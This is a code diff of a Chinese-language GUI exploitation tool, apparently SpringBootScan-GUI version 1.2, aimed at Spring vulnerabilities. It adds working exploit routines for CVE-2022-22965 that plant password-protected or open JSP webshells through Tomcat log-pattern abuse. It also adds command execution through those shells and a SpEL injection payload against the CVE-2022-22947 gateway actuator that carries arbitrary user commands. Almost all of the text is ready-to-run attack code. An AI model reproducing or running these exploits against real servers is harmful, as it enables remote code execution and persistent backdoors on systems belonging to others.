@@ -28,7 +28,7 @@ class RootFrom:
            \$$                                \$$$$$$                                        
             ______                                                                           
            /      \                                                                             
-          |  $$$$$$\  _______  ______   _______       SpringBootScan-GUI Version: 1.1
+          |  $$$$$$\  _______  ______   _______       SpringBootScan-GUI Version: 1.2
           | $$___\$$ /       \|      \ |       \    +----------------------------------+ 
            \$$    \ |  $$$$$$$ \$$$$$$\| $$$$$$$\   + 图形化 by:  →13exp←            + 
            _\$$$$$$\| $$      /      $$| $$  | $$   + https://github.com/13exp/        + 
@@ -46,7 +46,7 @@ class RootFrom:
       "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
       "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
       "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00")
-        cves = ("CVE-2022-22965","CVE-2022-22963","CVE-2022-22947")
+        cves = ("CVE-2022-22965","CVE-2022-22963","CVE-2022-22947","22965-aabyss-shell","22965-13exp-shell")
         no_proxies = []
         proxy_list = []
         self.root = tk.Tk()
@@ -215,7 +215,7 @@ class RootFrom:
             self.root.destroy()
         sys.exit()
     def shell_info(self):
-        messagebox.showinfo("Shell信息","tomcatwar.jsp?pwd=aabysszg&cmd=whoami")
+        messagebox.showinfo("CVE-2022-22965 Shell信息","CVE-2022-22965     :    shell.jsp?cmd=whoami\n22965-13exp-shell :    wbexp.jsp?pwd=13exp&cmd=whoami\n22965-aabyss-shell:    tomcatwar.jsp?pwd=aabysszg&cmd=whoami")
     def vule_info(self):
         webbrowser.open('https://blog.zgsec.cn/index.php/archives/129/')
     def fofa_viewer(self):
@@ -646,7 +646,7 @@ class RootFrom:
             threadDumpInfo.start()
         except KeyboardInterrupt:
             messagebox.showinfo('Info','interrupted by user, killing all threads...')
-    def CVE_2022_22965(self, url, proxies):
+    def CVE_2022_22965_aabysszg(self, url, proxies):
         title = "================开始对目标URL进行CVE-2022-22965漏洞利用================"
         self.info_text.insert(tk.INSERT,title)
         self.info_text.insert(tk.INSERT, '\n')
@@ -707,10 +707,110 @@ class RootFrom:
                 f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                 f.write("\n")
         return back
+    def CVE_2022_22965(self, url, proxies):
+        title = "================开始对目标URL进行CVE-2022-22965漏洞利用================"
+        self.info_text.insert(tk.INSERT,title)
+        self.info_text.insert(tk.INSERT, '\n')
+        ua = self.uas()
+        tar = '[+]target ' + url
+        self.info_text.insert(tk.INSERT,tar)
+        self.info_text.insert(tk.INSERT, '\n')
+        if self.log_var.get() == "启用":
+            with open("vuleLogs.log","a") as f:
+                f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                f.write("\n")
+        # Exp Header
+        post_headers = {
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+        get_headers = {
+            "prefix": "<%",
+            "suffix": "%>//",
+            "c": "Runtime",
+        }
+        Vule = self.CVEs.get()
+        if Vule == "CVE-2022-22965":
+            log_pattern = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
+                      f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
+                      f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
+                      f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
+        elif Vule == "22965-13exp-shell":
+            log_pattern = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
+                         f"if(%2213exp%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in" \
+                         f"%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()" \
+                         f"%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20" \
+                         f"while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
+        directory = "webapps/ROOT"
+        if Vule == "CVE-2022-22965":
+            filename = "shell"
+        elif Vule == "22965-13exp-shell":
+            filename = "wbexp"
+        log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
+        log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
+        log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
+        log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+        # Exp Data
+        exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
+        try:
+            requests.packages.urllib3.disable_warnings()
+            if proxies != "":
+                file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
+                ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False, proxies=proxies)
+                ret = requests.post(url, headers=post_headers, data=exp_data, verify=False, proxies=proxies)
+                back = "[+]Upload Exp: %d" % ret.status_code
+                self.info_text.insert(tk.INSERT,back)
+                self.info_text.insert(tk.INSERT, '\n') 
+            else:
+                file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
+                ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False)
+                ret = requests.post(url, headers=post_headers, data=exp_data, verify=False)
+                back = "[+]Upload Exp: %d" % ret.status_code
+                self.info_text.insert(tk.INSERT,back)
+                self.info_text.insert(tk.INSERT, '\n')
+            if ret.status_code == 200:
+                if proxies != "":
+                    sleep(3)
+                    ret = requests.get(url, headers=get_headers, verify=False, proxies=proxies)
+                    sleep(1)
+                    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
+                    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False, proxies=proxies)
+                    back = "[+]Wirte Shell Response Code: %d" % ret.status_code
+                    self.info_text.insert(tk.INSERT,back)
+                    self.info_text.insert(tk.INSERT, '\n')
+                else:
+                    sleep(3)
+                    ret = requests.get(url, headers=get_headers, verify=False)
+                    sleep(1)
+                    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
+                    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)
+                    back = "[+]Wirte Shell Response Code: %d" % ret.status_code
+                    self.info_text.insert(tk.INSERT,back)
+                    self.info_text.insert(tk.INSERT, '\n')
+                if Vule == "CVE-2022-22965":
+                    back = "[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "shell.jsp?cmd=whoami"
+                    self.info_text.insert(tk.INSERT,back)
+                    self.info_text.insert(tk.INSERT, '\n')
+                elif Vule == "22965-13exp-shell":
+                    back = "[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "wbexp.jsp?pwd=13exp&cmd=whoami"
+                    self.info_text.insert(tk.INSERT,back)
+                    self.info_text.insert(tk.INSERT, '\n')
+            else:
+                back = "[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址自行扫描"
+                self.info_text.insert(tk.INSERT,back)
+                self.info_text.insert(tk.INSERT, '\n')
+        except Exception as e:
+            back = str(e)
+            self.info_text.insert(tk.INSERT,back)
+            self.info_text.insert(tk.INSERT, '\n')
+        if self.log_var.get() == "启用":
+            with open("vuleLogs.log","a") as f:
+                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
+                f.write("\n")
+        return back
     def cve_2022_22965_exec(self):
         url = self.rank.get()
         if url != "":
-            title = "================CVE_2022_2296命令执行================"
+            title = "================CVE_2022_22965命令执行================"
             self.info_text.insert(tk.INSERT,title)
             self.info_text.insert(tk.INSERT, '\n')
             if self.log_var.get() == "启用":
@@ -731,20 +831,25 @@ class RootFrom:
                     f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()) + " start")
                     f.write("\n")
             cmd = self.reverse_tcp.get()
-            url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
+            if self.CVEs.get() == 'CVE-2022-22965':
+                url_shell = url + "shell.jsp?cmd={}".format(cmd)
+            elif self.CVEs.get() == '22965-aabyss-shell':
+                url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
+            elif self.CVEs.get() == '22965-13exp-shell':
+                url_shell = url + "wbexp.jsp?pwd=13exp&cmd={}".format(cmd)
             try:
                 r = requests.get(url_shell)
-                resp = r.text
-                #result = re.findall('([^\x00]+)\n', resp)[0]
+                resp = r.text.strip("\n")
+               #result = re.findall('([^\x00]+)\n', resp)[0].strip("\n")
                 result = resp
             except urllib3.util.ssl_match_hostname.CertificateError:
-                result = "[-] CVE_2022_2296命令执行 请求错误"
+                result = "[-] CVE_2022_22965命令执行 请求错误"
             except urllib3.exceptions.MaxRetryError:
-                result = "[-] CVE_2022_2296命令执行 请求错误"
+                result = "[-] CVE_2022_22965命令执行 请求错误"
             except requests.exceptions.SSLError:
-                result = "[-] CVE_2022_2296命令执行 请求错误"
+                result = "[-] CVE_2022_22965命令执行 请求错误"
             except:
-                result = "[-] CVE_2022_2296命令执行 未知错误"
+                result = "[-] CVE_2022_22965命令执行 未知错误"
             self.info_text.insert(tk.INSERT,str(result))
             self.info_text.insert(tk.INSERT, '\n')
             if self.log_var.get() == "启用":
@@ -771,7 +876,7 @@ class RootFrom:
             with open("vuleLogs.log","a") as f:
                 f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                 f.write("\n")
-        payload = 'T(java.lang.Runtime).getRuntime().exec("{}")'.format(execcmd)
+        payload = f'T(java.lang.Runtime).getRuntime().exec("{execcmd}")'
         ua = self.uas()
         data = 'test'
         header = {
@@ -797,7 +902,7 @@ class RootFrom:
                 back = f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹shell'
                 self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
-                back = '[+] 命令执行成功' + text
+                back = '[+] 命令执行成功 ' + execcmd
                 self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
             else:
@@ -820,7 +925,7 @@ class RootFrom:
             with open("vuleLogs.log","a") as f:
                 f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                 f.write("\n")
-    def CVE_2022_22947(self, url, proxies):
+    def CVE_2022_22947(self, url, proxies,execcmd):
         title = "================开始对目标URL进行CVE-2022-22947漏洞利用================"
         self.info_text.insert(tk.INSERT,title)
         self.info_text.insert(tk.INSERT, '\n')
@@ -849,11 +954,11 @@ class RootFrom:
                   "id": "hacktest",\r
                   "filters": [{\r
                     "name": "AddResponseHeader",\r
-                    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
+                    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"%s\\"}).getInputStream()))}"}\r
                     }],\r
                   "uri": "http://example.com",\r
                   "order": 0\r
-                }'''
+                }''' % execcmd
         try:
             requests.packages.urllib3.disable_warnings()
             if proxies != "":
@@ -868,7 +973,8 @@ class RootFrom:
                 re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
                 re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
                 re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
-            if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
+            #if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
+            if re5.status_code == 200:
                 back = "[+] Payload已经输出，回显结果如下：" + '\n' + re3.text + '[END]'
                 self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
@@ -916,27 +1022,24 @@ class RootFrom:
                         i = i +  "/"
                     info_proxy = self.proxy_get()
                     proxies = info_proxy[-1]
-                    if Vule == "CVE-2022-22965":
+                    if Vule == "CVE-2022-22965" or Vule == "22965-13exp-shell":
                         self.CVE_2022_22965(i, proxies)
                         #self.CVE_2022_22965(i, proxies)
                     elif Vule == "CVE-2022-22963":
                         self.CVE_2022_22963(i, proxies,execcmd)
                     elif Vule == "CVE-2022-22947":
-                        self.CVE_2022_22947(i, proxies)
+                        self.CVE_2022_22947(i, proxies,execcmd)
+                    elif Vule == "22965-aabyss-shell":
+                        self.CVE_2022_22965_aabysszg(i, proxies)
+                        
         else:
             url = url.strip("\n")
             if ('://' not in url):
                 url = str("http://") + str(url)
             if str(url[-1]) != "/":
                 url = url +  "/"
-            if Vule == "CVE-2022-22965":
-                back = self.CVE_2022_22965(url, proxies)
-                if "[-]" in back:
-                    back = "[+]执行二次验证中 等待5秒"
-                    self.info_text.insert(tk.INSERT,back)
-                    self.info_text.insert(tk.INSERT, '\n')
-                    sleep(5)
-                    self.CVE_2022_22965(url, proxies)
+            if Vule == "CVE-2022-22965" or Vule == "22965-13exp-shell":
+                self.CVE_2022_22965(url, proxies)
             elif Vule == "CVE-2022-22963":
                 execcmd = self.reverse_tcp.get()
                 if execcmd == "":
@@ -944,7 +1047,18 @@ class RootFrom:
                 else:
                     self.CVE_2022_22963(url, proxies,execcmd)
             elif Vule == "CVE-2022-22947":
-                self.CVE_2022_22947(url, proxies)
+                if execcmd == "":
+                    messagebox.showinfo("提示","执行命令不能为空,请重试！")
+                else:
+                    self.CVE_2022_22947(url, proxies,execcmd)
+            elif Vule == "22965-aabyss-shell":
+                back = self.CVE_2022_22965_aabysszg(url, proxies)
+                if "[-]" in back:
+                    back = "[+]执行二次验证中 等待5秒"
+                    self.info_text.insert(tk.INSERT,back)
+                    self.info_text.insert(tk.INSERT, '\n')
+                    sleep(5)
+                    self.CVE_2022_22965_aabysszg(url, proxies)
         back = "[+]漏洞扫描完成"
         self.info_text.insert(tk.INSERT,back)
         self.info_text.insert(tk.INSERT, '\n')
